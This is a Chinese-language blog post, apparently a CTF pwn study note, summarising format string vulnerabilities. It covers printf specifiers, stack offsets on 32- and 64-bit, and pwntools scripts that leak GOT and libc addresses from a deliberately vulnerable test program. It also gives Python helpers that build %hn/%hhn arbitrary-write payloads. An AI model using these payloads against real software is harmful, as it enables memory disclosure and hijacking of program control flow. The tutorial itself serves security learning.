<!DOCTYPE html>
<html lang="zh-CN">





<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="description" content>
  <meta name="author" content="chumen77">
  <meta name="keywords" content>
  <title>格式化字符串漏洞小总结（上） ~ Chumen77&#39;s Blog</title>

  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css">
<link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css">
<link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">


  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">

<link rel="stylesheet" href="/css/main.css">


  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css">


</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Chumen77's Blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">首页</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">归档</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">标签</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">关于</a>
          </li>
        
          
          
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" false
         style="background: url('/img/default.png')no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              <br>
              
                <p class="mt-3">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
                  星期四, 三月 12日 2020, 9:13 晚上
                </p>
              

              <p>
                
                  
                  &nbsp;<i class="far fa-chart-bar"></i>
                  <span class="post-count">
                    3.9k 字
                  </span>&nbsp;
                

                
                  
                  &nbsp;<i class="far fa-clock"></i>
                  <span class="post-count">
                      15 分钟
                  </span>&nbsp;
                

                
                  <!-- 不蒜子统计文章PV -->
                  
                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
                  <span id="busuanzi_container_page_pv">
                    <span id="busuanzi_value_page_pv"></span> 次
                  </span>&nbsp;
                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="py-5 z-depth-3" id="board">
        <div class="post-content mx-auto" id="post">
          <div class="markdown-body">
            <h1 id="格式化字符串漏洞小总结（上）"><a href="#格式化字符串漏洞小总结（上）" class="headerlink" title="格式化字符串漏洞小总结（上）"></a>格式化字符串漏洞小总结（上）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录一下，在学习这个漏洞时候的自己感觉的疑难点，和做题时候的一点小技巧，这一篇主要是记录理论。</p>
<h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p>基本格式：</p>
<pre><code class="c">%[parameter][flags][field width][.precision][length]type</code></pre>
<p>需要重点关注的pattern：</p>
<ol>
<li>parameter ：n$，获取格式化字符串中的指定参数</li>
<li>field width ：输出的最小宽度</li>
<li>precision ：输出的最大长度</li>
<li>length，输出的长度 : <code>hh，1-byte ； h，2-byte ； l, 4-byte ；ll,8-byte ；</code></li>
<li>type :<pre><code class="c"> d/i，有符号整数
 u，无符号整数
 x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母.
 s，输出以null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。
 c，把 int 参数转为 unsigned char 型输出
 p， void * 型，输出对应变量的值。printf(&quot;%p&quot;,a) 用地址的格式打印变量 a 的值，printf(&quot;%p&quot;, &amp;a) 打印变量 a 所在的地址。
 n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。（仅仅是在这一个printf的函数）
 %， &#39;%&#39;字面值，不接受任何 flags, width。</code></pre>
</li>
</ol>
<p>参数：就是是要对应输出的变量。</p>
<h2 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h2><p>格式化字符串函数是根据格式化字符串函数来进行解析的。那么相应的要被解析的参数的个数也自然是由这个<strong>格式化字符串</strong>所控制。<br><img src="http://qiqianyun.chumen77.xyz/uPic/PnScRI.png" srcset="/img/loading.gif" alt></p>
<p>根据 <strong>cdecl 的调用约定</strong>,在进入 printf()  函数之前,将参数从右到左依次压栈。进入printf()  之后,函数首先获取第一个参数,一次读取一个字符。如果字符不是    % ,字符直接复制到输出中。否则,读取下一个非空字符,获取相应的参数并解析输出。<br>如上图一样，格式化字符串的参数与后面实际提供的是一一对应的，就不会出现什么问题，但如果在格式化字符串多加几个格式化字符的时候，程序会怎么办呢？<strong>此时其可以正常通过编译，并且在栈上取值，按照给的格式化字符来解析对应栈上的值。此时也就发生了格式化字符串漏洞。</strong></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="泄露内存数据"><a href="#泄露内存数据" class="headerlink" title="泄露内存数据"></a>泄露内存数据</h3><h4 id="栈上的数据"><a href="#栈上的数据" class="headerlink" title="栈上的数据"></a>栈上的数据</h4><ol>
<li>利用 % order $ p / % order x 来获取指定参数对应栈的内存值 。(常用%p)</li>
<li>利用 % order $ s 来获取指定变量所对应地址的内容，只不过有零截断。(这个在做某些ctf题很好用，当一个程序上来读取一个flag到一个位置，然后你在栈上构造这个位置，直接%s就出来flag了。)<h4 id="任意地址内存"><a href="#任意地址内存" class="headerlink" title="任意地址内存"></a>任意地址内存</h4>当想泄露任意地址内存的时候，就需要<strong>想办法把地址写入栈中</strong>。<br>在一般情况下，格式化字符串也是存在栈上的，当可控的时候，就可以直接把某个地址写到这个格式化字符串上，然后找下在这个printf函数中<strong>对应的栈偏移</strong>，然后在用你想用的格式化字符（%p/%x/%s）来操作即可。然后在这个地方，其有个难点就是<strong>找对应的栈偏移</strong>。在我们实际用的时候，其实就是找栈上的某个位置对应这个格式化字符串的偏移，并且也分为32位于64位，因为其传参是不一样的。<h5 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h5><h6 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h6></li>
</ol>
<p><img src="http://qiqianyun.chumen77.xyz/uPic/jYXCSU.png" srcset="/img/loading.gif" alt><br>这是32位的栈对应情况，是比较好理解的。如图，并且发现这些指定参数的（如%4$x),其就是对应找对应栈上内容 ，而不指定的%x其找寻找的时候，是看下前面有个几个对应的无指定格式化字符，就想图上的情况，再给一个%x其是会找到arg4。</p>
<h6 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h6><p>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/KzxXZK.png" srcset="/img/loading.gif" alt><br>因为64位的参数存放是优先寄存器(rdi,rsi,rdx,rcx,r8,r9)，占满以后第7个参数才会存放在栈上。这就是跟32位找偏移不同地方。</p>
<h6 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h6><p>可以给gdb安装一下pwndbg，在GitHub上面找的到。然后演示一下：</p>
<pre><code class="c">#include &lt;stdio.h&gt;
int main(){
        setvbuf(stdout,0,2,0);
        char buf[100];
        read(0,buf,99);
        printf(buf);
}</code></pre>
<p>gdb调试，找图中框框的栈地址，对应的偏移：<br>32位：<br><img src="http://qiqianyun.chumen77.xyz/uPic/MCYXvC.png" srcset="/img/loading.gif" alt><br>64位：<br><img src="http://qiqianyun.chumen77.xyz/uPic/M6uXrw.png" srcset="/img/loading.gif" alt></p>
<p>注意是对应格式化字符串的偏移。用pwndbg的fmtarg确定偏移，就不用担心数错了。</p>
<h5 id="写地址进栈"><a href="#写地址进栈" class="headerlink" title="写地址进栈"></a>写地址进栈</h5><p>学会确定偏移后，就可以写地址进栈，来实现读任意地址内存了。经常使用的是，<strong>把这个程序中的某个got地址写进栈，然后就可以了来获取其内容，然后在根据其在libc中的偏移就可以计算出libc的基址，进而算出任意一个函数的地址（如system）</strong>。</p>
<h6 id="32位："><a href="#32位：" class="headerlink" title="32位："></a>32位：</h6><p>格式：<code>&lt;address&gt;%&lt;order&gt;$s</code><br>这样就可以尝试读出，adress处对应的值，但是因为是%s，其遇到\x00就会直接断了，没有想要的输出。更常有的情况就是，会输出一大堆，然后我们想要的地址掺杂在里面，所以可以改进一下，可以加一组标记，然后再去取出来想要，这样也可以来检测是否被\x00截断了。<br>改进格式：<code>&lt;address&gt;@@%&lt;order&gt;$s@@</code><br>在使用的时候记得除去 <strong>&lt; &gt;</strong>。<br>实例：</p>
<pre><code class="c">gdb-peda$ got

/media/psf/mypwn2/HITCON-Training-master/LAB/lab7/test:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ffc R_386_GLOB_DAT    __gmon_start__
0804a028 R_386_COPY        stdout@@GLIBC_2.0
0804a00c R_386_JUMP_SLOT   read@GLIBC_2.0
0804a010 R_386_JUMP_SLOT   printf@GLIBC_2.0
0804a014 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4
0804a018 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
0804a01c R_386_JUMP_SLOT   setvbuf@GLIBC_2.0</code></pre>
<p>获取一下got，选择read ： 0x0804a00c ,然后借助pwntools：</p>
<pre><code class="c">from pwn import *
context.log_level = &#39;debug&#39;
io = process(&#39;./test&#39;)
payload = p32(0x0804a00c) + &#39;@@%6$s@@&#39;
# raw_input(&#39;-&gt;&#39;)
io.sendline(payload)
io.recvuntil(&#39;@@&#39;)
print(&#39;leak-&gt;&#39; +hex(u32(io.recv(4))))
io.interactive()</code></pre>
<p><img src="http://qiqianyun.chumen77.xyz/uPic/BP69HU.png" srcset="/img/loading.gif" alt><br>发现出现了异常。<br>修改代码，查一下read在libc的symbols：</p>
<pre><code class="python">from pwn import *
context.log_level = &#39;debug&#39;
io = process(&#39;./test&#39;)
elf = ELF(&#39;./test&#39;)
libc = elf.libc
payload = p32(0x0804a00c) + &#39;@@%6$s@@&#39;
# raw_input(&#39;-&gt;&#39;)
io.sendline(payload)
io.recvuntil(&#39;@@&#39;)
print(&#39;leak-&gt;&#39; +hex(u32(io.recv(4))))
print(&#39;read-libc.symbols-&gt;&#39; + hex(libc.symbols[&#39;read&#39;]))
io.interactive()</code></pre>
<p><img src="http://qiqianyun.chumen77.xyz/uPic/B6kI8x.png" srcset="/img/loading.gif" alt><br>发现就是因为运气不好，这个libc版本里正好read函数是00结尾的，所以换一下:<br>Printf : 0x0804a010<br><img src="http://qiqianyun.chumen77.xyz/uPic/HwQRgy.png" srcset="/img/loading.gif" alt><br>这就可以了，并且还可以看出来的确是输出来一堆东西。</p>
<h6 id="64位-1"><a href="#64位-1" class="headerlink" title="64位"></a>64位</h6><p>在64位程序当中，一个地址的高位必定就是0，所以<strong>address是不能写到格式化字符串的最前面的</strong>，可以跟在fmt后面，但是这里就牵涉到了字节对齐问题，并且其偏移量算起来，当格式化字符串不做padding时，偏移量时会因为格式化字符串的长度而发生变化的。所以较好的做法，<strong>就是在格式化字符串处做好padding，这样解决了字节对齐，也解决了偏移量的计算。</strong><br>实例：（还是刚刚的程序编译成64位）</p>
<pre><code class="python">payload = &#39;@@%6$s@@&#39;.ljust(0x28,&#39;a&#39;) + p64(0x000000601020)</code></pre>
<p>这次把payload这样写，做好padding，把address写在后面，此时因为偏移会变，gdb调试一下看看，偏移变为多少：<br><img src="http://qiqianyun.chumen77.xyz/uPic/t6RmMP.png" srcset="/img/loading.gif" alt><br>可以看出来偏移为11。<br><img src="http://qiqianyun.chumen77.xyz/uPic/03RQ1J.png" srcset="/img/loading.gif" alt><br>发现再次运气不好，还是得换一个函数打印got，换成read：</p>
<pre><code class="python">from pwn import *
context.log_level = &#39;debug&#39;
io = process(&#39;./test3&#39;)
elf = ELF(&#39;./test3&#39;)
libc = elf.libc
payload = &#39;@@%11$s@@&#39;.ljust(0x28,&#39;a&#39;) + p64(0x000000601028)
raw_input(&#39;-&gt;&#39;)
io.sendline(payload)
io.recvuntil(&#39;@@&#39;)
print(&#39;leak-&gt;&#39; +hex(u64(io.recv(6).ljust(8,&quot;\x00&quot;))))
print(&#39;read-libc.symbols-&gt;&#39; + hex(libc.symbols[&#39;read&#39;]))
io.interactive()</code></pre>
<p><img src="http://qiqianyun.chumen77.xyz/uPic/mH8zy0.png" srcset="/img/loading.gif" alt><br>这样就OK了。</p>
<h5 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h5><ol>
<li>使用%s 读取内存里的任意位址，%s 会把对应的参数当做 <code>char*</code>指标并将目标做为字符串印出来</li>
<li>使用限制:Stack 上要有可控制 addres 的buffer ;注意由于是当做字符串打印，所以到 0 时就会中断,也要注意32位跟64位address的写在的位置。<h5 id="小技巧-1"><a href="#小技巧-1" class="headerlink" title="小技巧"></a>小技巧</h5><h6 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h6>想要泄露libc基址，还有就是通过返回<code>__libc_start_main + x</code>(libc版本不一样可能会不一样，本人是ubuntu16.04)<br><img src="http://qiqianyun.chumen77.xyz/uPic/IFdTkV.png" srcset="/img/loading.gif" alt><br>算一下偏移是21。<pre><code class="python">from pwn import *
context.log_level = &#39;debug&#39;
io = process(&#39;./test3&#39;)
elf = ELF(&#39;./test3&#39;)
libc = elf.libc
payload = &#39;%21$p&#39;.ljust(0x8,&#39;a&#39;)
raw_input(&#39;-&gt;&#39;)
io.sendline(payload)
io.recvuntil(&#39;0x&#39;)
libc_base = int(io.recv(12),16) - 240 - libc.symbols[&#39;__libc_start_main&#39;]
print(&#39;leak-&gt;&#39; +hex(libc_base))
io.interactive()</code></pre>
运行这个exp来leak libc的基址：<br><img src="http://qiqianyun.chumen77.xyz/uPic/MsG4Nl.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/R9cYuX.png" srcset="/img/loading.gif" alt><br>成功了。</li>
</ol>
<h6 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h6><p>泄露stack address ：<br><img src="http://qiqianyun.chumen77.xyz/uPic/rBKqdw.png" srcset="/img/loading.gif" alt><br>正如图中所示，会发现栈上说有很多与esp接近的数据，利用合适的数据根据偏移就会拿到esp的值，然后就得到了satck address。常用的也就是多层函数调用时，留下的ebp值。</p>
<h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><p>覆盖内存通常其实就是改写内存，其中分为<strong>改写栈上的内存和任意地址的内存</strong>，从而来控制程序的执行流程。（这里我先只记录一下任意地址的覆盖，改写栈上的内存暂时用不到）<br>这里面主要是使用<code>%n</code>, %n  转换指示符不输出字符，将 当前printf函数已经成功写入流或缓冲区中的字符个数写入对应的整型指针参数所指的变量。其核心就是：<strong>写入的值 = 已经输出的字符数</strong> ，知道这个以后，其<strong>使用起来就是控制好在这次%n前输出正确的字符数</strong>。</p>
<h4 id="任意地址覆盖"><a href="#任意地址覆盖" class="headerlink" title="任意地址覆盖"></a>任意地址覆盖</h4><ul>
<li>使用方法类似于%s的任意地址读取，只是换成了%n。</li>
<li>使用%xc的办法来控制输出的字符数。<br>基本格式： <code>....[overwrite addr]....%[overwrite offset]$n</code><br>其中<code>....</code> 表示我们的填充内容，<code>overwrite addr</code> 表示我们所要覆盖的地址，<code>overwrite offset</code> 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。也就是构造一个需要写入的address，然后用%xxc来控制写入的字符数，然后把握好偏移。</li>
</ul>
<h5 id="fmt字符串写入大小"><a href="#fmt字符串写入大小" class="headerlink" title="fmt字符串写入大小"></a>fmt字符串写入大小</h5><p>因为%n在一次的写入是在一次当中写入int大小的整数，当使用%xc来控制输出一个int大小的字符个数，这个printf函数会输出十分大的字符数量，这个结果对我们说十分不利的，一方面远端程序输出以后，自己接收是一个问题，是十分不稳定的，并且无法精准的控制需要修改的地方。<br>所以常用的是%hn 和%hhn，分别写入short和char大小的整数，然后分成多次写入以组合成完整的int整数，这个过程是十分稳定的。</p>
<h5 id="单次printf多次写入"><a href="#单次printf多次写入" class="headerlink" title="单次printf多次写入"></a>单次printf多次写入</h5><p>在进行GOT hijack或者改掉某一个指标的时候，通常会要求一次printf内就要来改写完成，不然改一半的值这个指标再被使用时程序很容易崩溃。<br>所以就可以把多个格式化字符串结合在一次，例如：</p>
<pre><code class="python">%xc%offset1$hn %yc%offset2$hn address address+2</code></pre>
<p>但这样就说需要小心偏移，并且输出的字符数也要控制好。难点也在控制这个多次写入时，c前面应该填多少的值。</p>
<h5 id="多次写入时控制输出的字符数"><a href="#多次写入时控制输出的字符数" class="headerlink" title="多次写入时控制输出的字符数"></a>多次写入时控制输出的字符数</h5><p>要注意的是<strong>%n写入的值是其前面输出的字符数。</strong></p>
<ol>
<li><p>第一次%xc%hhn的时候，要扣掉前面摆放的address的长度。比如32位时，其前面会摆放4个地址，这个时候就是x需要减去4x4 = 16.</p>
</li>
<li><p>之后每个%xc 必需扣掉前一个写入 byte 的值总字符数才会是这个写入需要的长度。比如 第一次写入值为 90 第二个写入 120 此时应为<code>%30c% offset$hhn</code></p>
</li>
<li><p>当某一次写入的值比前面写入的要小的时候，就需要整数overflow回来。比如：需要写入的一个字节，用的是hhn的时候，前面那次写入的是0x80，这次写入的是0x50，这时候就用0x50可以加上0x100（256）=0x150 （这时候因为是hhn，在截取的时候就是截取的0x50）， 再减去0x80 = 0xD0（208），也就是填入%208c%offset$hhn即可。</p>
</li>
</ol>
<p>当然这也是很规律的，在控制一个输出字符数，就分为3种情况：</p>
<ul>
<li>前面已经输出的字符数小于这次要输出的字符数</li>
<li>前面已经输出的字符数等于于这次要输出的字符数</li>
<li>前面已经输出的字符数大于这次要输出的字符数</li>
</ul>
<p>然后就可以写成一个脚本来实现自动化控制这个输出字符数：</p>
<p>单字节：</p>
<pre><code class="python"># prev 前面已经输出多少字符
# val 要写入的值
# idx  偏移
def fmt_byte(prev,val,idx,byte = 1):
    result = &quot;&quot;
    if prev &lt; val :
        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;
    elif prev == val :
        result += &#39;&#39;
    else :
        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;
    result += &quot;%&quot; + str(idx) + &quot;$hhn&quot;
    return result

#搭配：
prev = 0 
payload = &quot;&quot;
# x就是你要写入的字节数，例如在改写64位got时常用是6，因为其前两个字节都一样
# idx是偏移，key是要写入的目标值
for i in range(x):
    payload +=fmt_byte(prev,(key &gt;&gt; 8*i) &amp; 0xff,idx+i) 
    prev = (key &gt;&gt; i*8) &amp; 0xff</code></pre>
<p>双字节：</p>
<pre><code class="python">#跟上个基本一样，只是改了部分地方
def fmt_short(prev,val,idx,byte = 2):
    result = &quot;&quot;
    if prev &lt; val :
        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;
    elif prev == val :
        result += &#39;&#39;
    else :
        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;
    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;
    return result

prev = 0 
payload = &quot;&quot;
for i in range(x):
    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,idx+i) 
    prev = (key &gt;&gt; i*16) &amp; 0xffff</code></pre>
<p>在使用这两个脚本的时候，常用的<strong>是在获取到payload的时候也用<code>payload.ljust()</code>做好padding,来控制好字节对齐，然后再摆上需要写入x组的地址。（一会在题目中会有演示）</strong></p>
<h5 id="pwntools-pwnlib-fmtstr-模块"><a href="#pwntools-pwnlib-fmtstr-模块" class="headerlink" title="pwntools pwnlib.fmtstr 模块"></a>pwntools pwnlib.fmtstr 模块</h5><pre><code class="python">pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size=&#39;byte&#39;)</code></pre>
<ul>
<li>offset (int):你控制的第一个格式化程序的偏移量</li>
<li>writes (dict):格式为 {addr: value, addr2: value2},用于往 addr 里写入 value (常用:<code>{printf_got}</code>)</li>
<li>numbwritten (int):已经由 printf 函数写入的字节数</li>
<li><code>write_size (str)</code>:必须是 byte,short 或 int。限制你是要逐 byte 写,逐 short 写还是逐 int 写(hhn,hn或n)</li>
</ul>
<p>这个函数是十分好用的，具体可以去看一下pwntools的官方介绍，但是实际使用当中，会发现几个问题：</p>
<ul>
<li>在64位中，并不好用，自动生成的payload中，它不会将地址放在格式化字符串之后，导致用不了。</li>
<li>在面对单次printf，实施多次写入的时候其更显的十分无力。</li>
</ul>
<p>记录到这里，理论部分就差不多完了，下一篇主要记录的就是题解篇，会包含一些技巧，常见的ctf格式化字符串题目漏洞利用的常见套路，还有格式化字符串漏洞的高级利用（当格式化字符串漏洞的buf在bss上，这就意味着我们无法直接往栈上写地址，该怎么办？并且这种题目常在赛题中出现）</p>

            <hr>
          </div>
          <br>
          <div>
            <p>
            
            
              <span>
                <i class="iconfont icon-tag"></i>
                
                  <a class="hover-with-bg" href="/tags/pwn">pwn</a>
                
                  <a class="hover-with-bg" href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95">学习记录</a>
                
              </span>
            
            </p>
            
              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
            
          </div>
        </div>
      </div>
    </div>
    <div class="d-none d-lg-block col-lg-2 toc-container">
      
  <div id="toc">
    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;目录</p>
    <div id="tocbot"></div>
  </div>

    </div>
  </div>
</div>

<!-- custom -->


<!-- Comments -->
<div class="col-lg-7 mx-auto nopadding-md">
  <div class="container comments mx-auto" id="comments">
    
  </div>
</div>

    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  <footer class="mt-5">
  <div class="text-center py-3">
    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
    <i class="iconfont icon-love"></i>
    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
    <br>

    
  
    <!-- 不蒜子统计PV -->
    
    &nbsp;<span id="busuanzi_container_site_pv"></span>总访问量 
          <span id="busuanzi_value_site_pv"></span> 次&nbsp;
  
  
    <!-- 不蒜子统计UV -->
    
    &nbsp;<span id="busuanzi_container_site_uv"></span>总访客数 
            <span id="busuanzi_value_site_uv"></span> 人&nbsp;
  
  <br>



    


    <!-- cnzz Analytics icon -->
    

  </div>
</footer>

<!-- SCRIPTS -->
<script src="/lib/jquery/jquery.min.js" ></script>
<script src="/lib/popper/popper.min.js" ></script>
<script src="/lib/bootstrap/js/bootstrap.min.js" ></script>
<script src="/lib/mdbootstrap/js/mdb.min.js" ></script>
<script src="/js/main.js" ></script>


  <script src="/js/lazyload.js" ></script>



  
    <script src="/lib/tocbot/tocbot.min.js" ></script>
  
  <script src="/js/post.js" ></script>



  <script src="/lib/smoothscroll/SmoothScroll.min.js" ></script>



  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>


<!-- Plugins -->


  

  

  

  

  <!-- cnzz Analytics -->
  



  <script src="/lib/prettify/prettify.min.js" ></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  linenums');
      prettyPrint();
    })
  </script>



  <script src="/lib/typed/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "格式化字符串漏洞小总结（上）&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="/lib/anchor/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "false",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script src="/lib/fancybox/jquery.fancybox.min.js" ></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>





  
  
    <script type="text/javascript">
      //定义获取词语下标
      var a_idx = 0;
      jQuery(document).ready(function ($) {
        //点击body时触发事件
        $("body").click(function (e) {
          //需要显示的词语
          var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正", "法治", "爱国", "敬业", "诚信", "友善");
          //设置词语给span标签
          var $i = $("<span/>").text(a[a_idx]);
          //下标等于原来下标+1  余 词语总数
          a_idx = (a_idx + 1) % a.length;
          //获取鼠标指针的位置，分别相对于文档的左和右边缘。
          //获取x和y的指针坐标
          var x = e.pageX, y = e.pageY;
          //在鼠标的指针的位置给$i定义的span标签添加css样式
          $i.css({
            "z-index": 999,
            "top": y - 20,
            "left": x,
            "position": "absolute",
            "font-weight": "bold",
            "color": rand_color()
          });
          // 随机颜色
          function rand_color() {
            return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
          }
          //在body添加这个标签
          $("body").append($i);
          //animate() 方法执行 CSS 属性集的自定义动画。
          //该方法通过CSS样式将元素从一个状态改变为另一个状态。CSS属性值是逐渐改变的，这样就可以创建动画效果。
          //详情请看http://www.w3school.com.cn/jquery/effect_animate.asp
          $i.animate({
            //将原来的位置向上移动180
            "top": y - 180,
            "opacity": 0
            //1500动画的速度
          }, 1500, function () {
            //时间到了自动删除
            $i.remove();
          });
        });
      })
      ;
    </script>
  








</body>
</html>
